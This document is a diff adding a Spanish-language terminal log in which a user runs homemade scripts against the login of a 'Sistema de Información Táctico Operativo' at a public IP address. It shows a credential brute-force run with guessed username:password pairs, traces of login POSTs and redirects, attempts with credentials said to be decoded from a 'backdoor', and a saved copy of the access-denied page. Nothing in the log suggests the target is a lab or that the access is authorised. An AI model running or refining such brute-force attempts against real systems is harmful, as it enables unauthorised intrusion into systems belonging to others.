@@ -1,0 +1,169 @@
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ ./tengo_sueño.sh 
+=== ANALIZANDO ACCESO_DENEGADO.JSP ===
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1750  100  1750    0     0   3874      0 --:--:-- --:--:-- --:--:--  3880
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1750  100  1750    0     0   4727      0 --:--:-- --:--:-- --:--:--  4716
+✅ Mismo contenido con sesión
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ python3 YaPorfa.py 
+=== FUERZA BRUTA INTELIGENTE MEJORADA ===
+❌ Denegado: jose:garcia
+❌ Denegado: tono:garcia
+❌ Denegado: jose.tono:garcia
+❌ Denegado: jgarcia:tono
+❌ Denegado: garcia:jose
+❌ Denegado: equipo:sito
+❌ Denegado: sito:equipo
+❌ Denegado: admin:sito
+❌ Denegado: sito:admin
+❌ Denegado: jose:utslp
+❌ Denegado: tono:utslp
+❌ Denegado: garcia:utslp
+❌ Denegado: jose:ISCT
+❌ Denegado: tono:ISCT
+❌ Denegado: garcia:ISCT
+❌ Denegado: jose:2010
+❌ Denegado: tono:2010
+❌ Denegado: garcia:2010
+❌ Denegado: jose:Jose123
+❌ Denegado: tono:Tono123
+❌ Denegado: garcia:Garcia123
+❌ Denegado: jose:Jose2024
+❌ Denegado: tono:Tono2024
+❌ Denegado: garcia:Garcia2024
+❌ Denegado: jose:JlGarcia
+❌ Denegado: tono:JTono
+❌ Denegado: garcia:JGarcia
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ ./Cae_ya.sh 
+=== ANÁLISIS DETALLADO DE REDIRECCIONES ===
+* ALPN: curl offers h2,http/1.1
+* using HTTP/1.x
+> POST /jsp/menu.jsp HTTP/1.1
+< HTTP/1.1 302 Movido temporalmente
+< Set-Cookie: JSESSIONID=E3DC6DE90338ECEC603A6C22C8AE684B; Path=/; Secure
+< Location: https://189.254.143.102/jsp/acceso_denegado.jsp
+> GET /jsp/acceso_denegado.jsp HTTP/1.1
+< HTTP/1.1 200 OK
+< Set-Cookie: JSESSIONID=750F2A4D7D814D9B6CCAA656D5630AA9; Path=/; Secure
+* ALPN: curl offers h2,http/1.1
+* using HTTP/1.x
+> POST /jsp/menu.jsp HTTP/1.1
+< HTTP/1.1 302 Movido temporalmente
+< Location: https://189.254.143.102/jsp/acceso_denegado.jsp
+> GET /jsp/acceso_denegado.jsp HTTP/1.1
+< HTTP/1.1 200 OK
+                  
+                  
+=== ANÁLISIS AUTOMÁTICO DE RESPUESTAS DE LOGIN ===
+--- Probando: jose / garcia (Nombre decodificado del backdoor) ---
+HTTP Code: 302
+URL Final: https://189.254.143.102/jsp/menu.jsp
+Tamaño contenido: 0 caracteres
+🚨 URL DIFERENTE - POSIBLE ÉXITO!
+
+--- Probando: tono / garcia (Apellido decodificado) ---
+HTTP Code: 302
+URL Final: https://189.254.143.102/jsp/menu.jsp
+Tamaño contenido: 0 caracteres
+🚨 URL DIFERENTE - POSIBLE ÉXITO!
+
+--- Probando: equipo / sito (Equipo del backdoor) ---
+HTTP Code: 302
+URL Final: https://189.254.143.102/jsp/menu.jsp
+Tamaño contenido: 0 caracteres
+🚨 URL DIFERENTE - POSIBLE ÉXITO!
+
+--- Probando: admin / sito (Combinación común) ---
+HTTP Code: 302
+URL Final: https://189.254.143.102/jsp/menu.jsp
+Tamaño contenido: 0 caracteres
+🚨 URL DIFERENTE - POSIBLE ÉXITO!
+
+--- Probando: jose / tono (Nombre y apellido invertidos) ---
+HTTP Code: 302
+URL Final: https://189.254.143.102/jsp/menu.jsp
+Tamaño contenido: 0 caracteres
+🚨 URL DIFERENTE - POSIBLE ÉXITO!
+
+                                                                                
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ 
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ python Dame_algo.py       
+=== ANALIZANDO ESTRUCTURA REAL DEL LOGIN ===
+Status Code (GET): 200
+Tamaño: 1750
+URL: https://189.254.143.102/jsp/acceso_denegado.jsp;jsessionid=6CE96D2AEA889476A5CB6B6CD194AF31
+
+--- Formulario 1 ---
+  name="forma" method="post" action=""
+
+✅ Página guardada en: login_page_analysis.html
+                                                                                
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ cat login_page_analysis.html 
+
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title> Sistema de Información Táctico Operativo </title>
+
+        <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/cells.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/characters.css" type="text/css">
+</head>
+
+<body>
+<form name="forma" method="post" action="">
+        <br>
+        <table class="TablaDatosTitulo" width="100%" align="center" cellpadding="0" cellspacing="0">
+                <th class="CeldaDatosTitulo"> Acceso Denegado </th>
+                <td align="right">
+                        <table border="0" width="110" cellpadding="0" cellspacing="0">
+                                <tr>
+                                        <td align="right">
+                                                <img src="../images/home_16.gif">
+                                                <a href="cerrar_sesion.jsp" target="_top" class="CeldaBoton" onmouseover="this.className='CeldaBotonSeleccionado'" onmouseout="this.className='CeldaBoton'"> 
+                                                        Iniciar Sesión 
+                                                </a>
+                                                &nbsp;
+                                        </td>
+                                </tr>
+                        </table>
+                </td>
+        </table>
+        <table border="0" width="100%" align="center" cellpadding="0" cellspacing="0">
+                <colgroup>
+                        <col width="20%"> <col width="80%">
+                </colgroup>
+                <tr class="CeldaDatos">
+                        <td colspan="2">&nbsp;  </td>
+                </tr>
+                <tr class="CeldaDatos">
+                        <td align="center"> <img src="../images/stop_32.gif"> </td>
+                        <td> Debe introducir su cuenta para acceder al sistema </td>
+                </tr>
+                <tr class="CeldaDatos">
+                        <td colspan="2">&nbsp;  </td>
+                </tr>
+        </table>
+</form>
+</body>
+</html>
+                                                                                
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ 
+
